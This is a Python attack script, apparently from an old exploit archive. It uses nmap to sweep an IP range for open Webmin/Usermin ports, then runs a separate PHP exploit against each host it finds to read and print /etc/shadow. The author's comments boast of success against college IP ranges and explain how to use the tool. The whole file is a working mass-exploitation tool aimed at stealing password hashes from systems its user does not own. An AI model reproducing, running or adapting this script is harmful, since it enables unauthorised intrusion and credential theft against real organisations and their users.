#!/usr/bin/python
#Uses nmap to scan ip range for open webmin/usermin
#ports then exploits them. Make sure to put "http://www.milw0rm.com/exploits/1997"
#this exploit in the same dir or edit line 28.
#I've had great success with college ip ranges, feel free and change the nmap flag
#but remember to su root if using -sS.
#d3hydr8[at]gmail[dot]com

import commands, sys, getopt, StringIO, re

tmp, args = getopt.getopt(sys.argv[1:],"")
	
def rand_scan(port):

	iprange = args[0]
	ip_list = []
	
	nmap = StringIO.StringIO(commands.getstatusoutput('nmap -P0 '+iprange+' -p '+port+' | grep open -B 3')[1]).readlines()
	
	for tmp in nmap:
		ipaddr = re.findall("\d*\.\d*\.\d*\.\d*", tmp)
		if ipaddr:
	    		ip_list.append(ipaddr[0])
	print len(ip_list), "hosts to exploit for port",port,"...\n"	
		   

	for ip in ip_list:
		web = StringIO.StringIO(commands.getstatusoutput('php webmin.php '+ip+' '+port+' http /etc/shadow')[1]).readlines()
		for line in web: print line
			
#................................................
	
if args == []:
	print "Usage: ./webmin.py <ip range>"
else:
	print "\nScanning", args[0],"\b...\n"
	rand_scan(port = str(10000))
	rand_scan(port = str(20000))
